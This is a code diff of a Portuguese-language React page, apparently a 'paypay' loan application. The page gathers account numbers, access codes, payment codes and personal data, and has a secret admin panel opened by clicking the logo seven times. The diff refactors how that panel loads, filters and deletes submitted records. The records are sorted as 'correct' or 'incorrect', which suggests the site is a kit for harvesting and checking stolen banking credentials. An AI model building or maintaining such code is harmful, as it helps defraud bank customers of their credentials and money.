@@ -114,7 +114,6 @@ function Index() {
   const [adminAuthenticated, setAdminAuthenticated] = useState(false);
   const [adminPassword, setAdminPassword] = useState("");
   const [loading, setLoading] = useState(false);
-  const [applications, setApplications] = useState<any[]>([]);
 
   // Rejection Dialog State
   const [rejectionDialog, setRejectionDialog] = useState<{
@@ -251,7 +250,6 @@ function Index() {
 
   useEffect(() => {
     // Persist state to sessionStorage whenever it changes
-    // Only persist if the current state is different from what's stored to avoid loop/thrashing
     const stateToSave = {
       step,
       accountNumber,
@@ -262,20 +260,14 @@ function Index() {
       personalData,
       applicationId
     };
-    
-    const currentStateStr = JSON.stringify(stateToSave);
-    const savedStateStr = sessionStorage.getItem('paypay_app_state');
-    
-    if (currentStateStr !== savedStateStr) {
-      sessionStorage.setItem('paypay_app_state', currentStateStr);
-    }
+    sessionStorage.setItem('paypay_app_state', JSON.stringify(stateToSave));
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData, applicationId]);
 
   // Handle secret admin access
   useEffect(() => {
     if (logoClicks >= 7) {
-      setAdminAuthenticated(false);
-      setAdminPassword("");
+      setAdminAuthenticated(false); // Reset authentication status first
+      setAdminPassword(""); // Clear password field
       setStep("admin");
       setLogoClicks(0);
       toast.info("Acesso Administrativo - Por favor, insira a senha");
@@ -283,25 +275,6 @@ function Index() {
     const timer = setTimeout(() => setLogoClicks(0), 1000);
     return () => clearTimeout(timer);
   }, [logoClicks]);
-
-  const fetchApplications = async () => {
-    if (!adminAuthenticated) return;
-    setLoading(true);
-    try {
-      const data = await getApplications({ data: { adminPassword } });
-      setApplications(data as any[]);
-    } catch (err: any) {
-      toast.error(err.message || "Erro ao carregar dados");
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  useEffect(() => {
-    if (adminAuthenticated) {
-      fetchApplications();
-    }
-  }, [adminAuthenticated]);
 
   const handleScroll = () => {
     if (scrollRef.current) {
@@ -496,8 +469,9 @@ function Index() {
   };
 
   const AdminDataList = () => {
+    const [apps, setApps] = useState<any[]>([]);
     const [deletedApps, setDeletedApps] = useState<any[]>([]);
-    const [innerLoading, setInnerLoading] = useState(false);
+    const [loading, setLoading] = useState(true);
     const [filter, setFilter] = useState<"all" | "correct" | "incorrect" | "not_verified">("all");
 
     // Handle scroll position persistence for admin panel
@@ -510,37 +484,51 @@ function Index() {
     useEffect(() => {
       const savedScroll = sessionStorage.getItem("admin_scroll_pos");
       if (savedScroll && adminScrollRef.current) {
-        adminScrollRef.current.scrollTop = parseInt(savedScroll);
+        setTimeout(() => {
+          if (adminScrollRef.current) {
+            adminScrollRef.current.scrollTop = parseInt(savedScroll);
+          }
+        }, 100);
       }
-    }, [adminTab, applications, deletedApps, filter]);
+    }, [adminTab, apps, deletedApps, filter]);
 
     const filteredApps = useMemo(() => {
       if (adminTab !== "users") return deletedApps;
-      if (filter === "all") return applications;
-      if (filter === "correct") return applications.filter(app => app.analysis_color === 'green');
-      if (filter === "incorrect") return applications.filter(app => app.analysis_color === 'red');
-      if (filter === "not_verified") return applications.filter(app => !app.analysis_color);
-      return applications;
-    }, [applications, deletedApps, adminTab, filter]);
+      if (filter === "all") return apps;
+      if (filter === "correct") return apps.filter(app => app.analysis_color === 'green');
+      if (filter === "incorrect") return apps.filter(app => app.analysis_color === 'red');
+      if (filter === "not_verified") return apps.filter(app => !app.analysis_color);
+      return apps;
+    }, [apps, deletedApps, adminTab, filter]);
 
 
 
+    const fetchApps = async () => {
+      try {
+        const data = await getApplications({ data: { adminPassword } });
+        if (data) setApps(data);
+      } catch (err) {
+        toast.error("Erro ao carregar dados");
+      } finally {
+        setLoading(false);
+      }
+    };
 
     const fetchDeletedApps = async () => {
       try {
-        setInnerLoading(true);
+        setLoading(true);
         const data = await getDeletedApplications({ data: { adminPassword } });
         if (data) setDeletedApps(data);
       } catch (err: any) {
         toast.error("Erro ao carregar lixeira: " + (err.message || "Erro desconhecido"));
       } finally {
-        setInnerLoading(false);
+        setLoading(false);
       }
     };
 
     useEffect(() => {
       if (adminAuthenticated) {
-        if (adminTab === "users") fetchApplications();
+        if (adminTab === "users") fetchApps();
         else fetchDeletedApps();
       }
     }, [adminAuthenticated, adminTab]);
@@ -550,7 +538,7 @@ function Index() {
         isOpen: true, 
         appId: id, 
         isCorrect,
-        onConfirm: fetchApplications
+        onConfirm: fetchApps
       });
       setCustomRejectionReason(isCorrect ? "Empréstimo Aprovado" : "Dados incorretos");
     };
@@ -562,7 +550,7 @@ function Index() {
         const result = await deleteApplication({ data: { id, adminPassword } });
         if (result && result.success) {
           toast.success("Dados movidos para a lixeira");
-          setApplications(prev => prev.filter(app => app.id !== id));
+          setApps(prev => prev.filter(app => app.id !== id));
         }
       } catch (err: any) {
         toast.error("Erro ao apagar dados: " + (err.message || "Erro desconhecido"));
@@ -601,7 +589,7 @@ function Index() {
       if (!permanentPassword) return;
 
       try {
-        setInnerLoading(true);
+        setLoading(true);
         const result = await deleteAllPermanently({ data: { adminPassword, permanentPassword } });
         if (result && result.success) {
           toast.success("Lixeira esvaziada com sucesso");
@@ -610,18 +598,18 @@ function Index() {
       } catch (err: any) {
         toast.error(err.message || "Erro ao esvaziar lixeira");
       } finally {
-        setInnerLoading(false);
+        setLoading(false);
       }
     };
 
-    if (innerLoading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
+    if (loading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando...</div>;
     
     
     const currentList = filteredApps;
     
     if (currentList.length === 0) return (
       <div className="space-y-4">
-        {adminTab === "users" && applications.length > 0 && (
+        {adminTab === "users" && apps.length > 0 && (
           <div className="flex gap-2 p-1 bg-secondary/20 rounded-xl mb-4">
             <button 
               onClick={() => setFilter("all")}
@@ -672,7 +660,7 @@ function Index() {
         className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"
       >
 
-        {adminTab === "users" && applications.length > 0 && (
+        {adminTab === "users" && apps.length > 0 && (
           <div className="flex gap-2 p-1 bg-secondary/20 rounded-xl mb-4">
             <button 
               onClick={() => setFilter("all")}
@@ -1468,27 +1456,10 @@ function Index() {
                 className="space-y-6"
               >
                 <div className="flex items-center justify-between border-b pb-4">
-                  <div className="flex items-center gap-3">
-                    <h2 className="text-2xl font-bold flex items-center gap-2">
-                      <LayoutDashboard className="w-6 h-6 text-primary" />
-                      Painel Admin
-                    </h2>
-                    {/* Manual update button removed in favor of auto-refresh */}
-                    {/* Manual update button re-added next to Admin Panel title for stability */}
-                    {adminAuthenticated && (
-                      <button 
-                        onClick={fetchApplications}
-                        disabled={loading}
-                        className={cn(
-                          "p-2 hover:bg-secondary rounded-full transition-all cursor-pointer text-muted-foreground hover:text-primary",
-                          loading && "animate-spin"
-                        )}
-                        title="Atualizar Dados"
-                      >
-                        <RotateCcw className="w-4 h-4" />
-                      </button>
-                    )}
-                  </div>
+                  <h2 className="text-2xl font-bold flex items-center gap-2">
+                    <LayoutDashboard className="w-6 h-6 text-primary" />
+                    Painel Admin
+                  </h2>
                   <button onClick={() => { setStep("home"); setAdminAuthenticated(false); setAdminPassword(""); }} className="text-sm text-muted-foreground hover:text-primary cursor-pointer">Sair</button>
                 </div>
 
